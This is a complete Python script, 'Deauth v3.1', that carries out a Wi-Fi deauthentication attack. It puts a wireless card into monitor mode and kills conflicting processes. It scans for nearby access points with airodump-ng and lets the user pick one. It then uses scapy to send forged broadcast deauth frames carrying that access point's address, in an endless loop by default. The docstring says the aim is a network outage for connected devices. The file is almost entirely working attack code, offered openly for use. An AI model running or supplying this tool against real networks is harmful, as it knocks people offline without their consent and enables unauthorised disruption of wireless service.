#!/usr/bin/env python3
"""
Deauth v3.1 - Optimized Python3 script
Sends deauth packets to a Wi-Fi network causing network outage for connected devices.

Features:
- Automatic airmon-ng check kill
- Detects existing monitor interfaces
- Captures SSID correctly
- Sets correct channel before deauth
- Daemon mode and packet count override
"""

__author__ = "Ayush Gulati"
__version__ = "3.1"
__license__ = "Apache 2.0"

import os, sys, re, subprocess, time, signal, glob, csv, logging

# Silence scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
try:
    import scapy.all as scapy
except Exception:
    print("[-] scapy module not found. Install via: sudo pip3 install scapy")
    sys.exit(1)
scapy.conf.verbose = False

PID_FILE = "/var/run/deauth.pid"
WIRELESS_FILE = "/proc/net/wireless"
DEV_FILE = "/proc/net/dev"
PACKET_COUNT = 2000
GREEN = '\033[92m'
RED = '\033[91m'
ENDC = '\033[0m'

def banner():
    print("\n+---------------------------------------------------------------------------------------+")
    print("| Deauth v3.1 (Python3) - Optimized version                                            |")
    print("+---------------------------------------------------------------------------------------+\n")

def execute(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return output.decode(errors='ignore').strip()
    except subprocess.CalledProcessError as e:
        return e.output.decode(errors='ignore').strip()

class InterfaceManager:
    def __init__(self):
        self.Iface = None
        self.monIface = None
        self.detect_interfaces()
    
    def detect_interfaces(self):
        # Detect monitor interface
        try:
            with open(DEV_FILE) as f:
                content = f.read()
            mon_list = re.findall(r'(mon[0-9]+|[a-zA-Z0-9]+mon)', content)
            if mon_list:
                self.monIface = mon_list[0]
        except Exception:
            pass
        
        # Detect managed interface
        try:
            with open(WIRELESS_FILE) as f:
                content = f.read()
            m = re.findall(r'(.*):', content)
            if m:
                self.Iface = m[0].strip()
        except Exception:
            pass

    def ensure_monitor(self):
        if self.monIface:
            print(GREEN + f"[*] Found existing monitor interface: {self.monIface}" + ENDC)
        else:
            if not self.Iface:
                print(RED + "[-] Wireless interface not found" + ENDC)
                self.Iface = input("Enter wireless interface> ").strip()
            print("[.] Starting monitor mode on {}".format(self.Iface))
            execute(f"sudo airmon-ng start {self.Iface} > /dev/null 2>&1")
            time.sleep(1)
            self.detect_interfaces()
            if not self.monIface:
                print(RED + "[-] Failed to create monitor interface" + ENDC)
                sys.exit(1)
            print(GREEN + f"[*] Monitor interface: {self.monIface}" + ENDC)

def airodump_scan(mon_iface, duration=6):
    """
    Scan WiFi using airodump-ng and return AP list: {ID: [BSSID, SSID, channel]}
    """
    print("[.] Running 'airmon-ng check kill' to prevent conflicts")
    execute("sudo airmon-ng check kill > /dev/null 2>&1")

    out_base = "/tmp/airodump_scan"
    for p in glob.glob(out_base + "*"): os.remove(p)

    cmd = f"sudo airodump-ng --write-interval 1 --output-format csv -w {out_base} {mon_iface}"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(duration)
    proc.terminate()
    try: proc.wait(timeout=2)
    except Exception: proc.kill()

    matches = glob.glob(out_base + "*.csv")
    if not matches: return {}
    csv_path = max(matches, key=os.path.getmtime)

    ap_list = {}
    try:
        with open(csv_path, newline='', errors='ignore') as f:
            lines = f.read().splitlines()
        header_idx = next((i for i, l in enumerate(lines) if l.strip().lower().startswith("bssid,")), None)
        if header_idx is None: return {}
        ap_rows = []
        for line in lines[header_idx:]:
            if not line.strip() or line.lower().startswith("station mac"): break
            ap_rows.append(line)
        reader = csv.reader(ap_rows)
        parsed = list(reader)
        header = parsed[0]
        bssid_idx = next((i for i, col in enumerate(header) if col.strip().lower() == "bssid"), None)
        essid_idx = next((i for i, col in enumerate(header) if col.strip().lower() in ("essid","ssid")), None)
        ch_idx = next((i for i, col in enumerate(header) if col.strip().lower() == "channel"), None)
        idx_counter = 1
        for row in parsed[1:]:
            if len(row) <= bssid_idx: continue
            bssid = row[bssid_idx].strip()
            ssid = row[essid_idx].strip() if essid_idx is not None and len(row) > essid_idx else ""
            ch = row[ch_idx].strip() if ch_idx is not None and len(row) > ch_idx else ""
            if ssid.lower() in ("<length:0>", "(hidden)", "hidden","<hidden>"): ssid=""
            if ssid.startswith('"') and ssid.endswith('"'): ssid=ssid[1:-1]
            if bssid: ap_list[str(idx_counter)] = [bssid, ssid, ch]; idx_counter+=1
    except Exception: pass

    for p in glob.glob(out_base + "*"): os.remove(p)
    return ap_list

def choose_ap(ap_list):
    if not ap_list: print(RED + "[-] No WiFi hotspots found." + ENDC); sys.exit(1)
    print("+-----+----------------------------+--------------------+")
    print("| ID  |     Wifi Hotspot Name      |    MAC Address     |")
    print("+-----+----------------------------+--------------------+")
    for id, data in ap_list.items():
        print(f"| {id.ljust(3)} | {data[1].ljust(26)} | {data[0].ljust(18)} |")
    print("+-----+----------------------------+--------------------+")
    while True:
        choice = input("Choose ID>>").strip()
        if choice in ap_list: return ap_list[choice]
        print("Invalid ID. Try again.")

def send_deauth(target, mon_iface, count=None):
    bssid, ssid, ch = target
    if ch:
        execute(f"sudo iwconfig {mon_iface} channel {ch}")
        print(GREEN + f"[*] Set monitor interface {mon_iface} to channel {ch}" + ENDC)
    pkt = scapy.RadioTap()/scapy.Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)/scapy.Dot11Deauth()
    print(GREEN + f"[*] Sending Deauthentication Packets to -> {ssid if ssid else bssid}" + ENDC)
    sent=0
    try:
        if count is None:
            while True: scapy.sendp(pkt, iface=mon_iface, count=1, inter=.2, verbose=0); sent+=1
        else:
            for _ in range(int(count)): scapy.sendp(pkt, iface=mon_iface, count=1, inter=.2, verbose=0); sent+=1
    except KeyboardInterrupt:
        print(GREEN + f"\n[*] Interrupted by user. Sent {sent} packets." + ENDC)
        sys.exit(0)

if __name__ == "__main__":
    if os.geteuid() != 0: print(RED + "[-] Run as root or sudo" + ENDC); sys.exit(1)
    banner()
    iface = InterfaceManager()
    iface.ensure_monitor()
    ap_list = airodump_scan(iface.monIface)
    target = choose_ap(ap_list)
    send_deauth(target, iface.monIface)
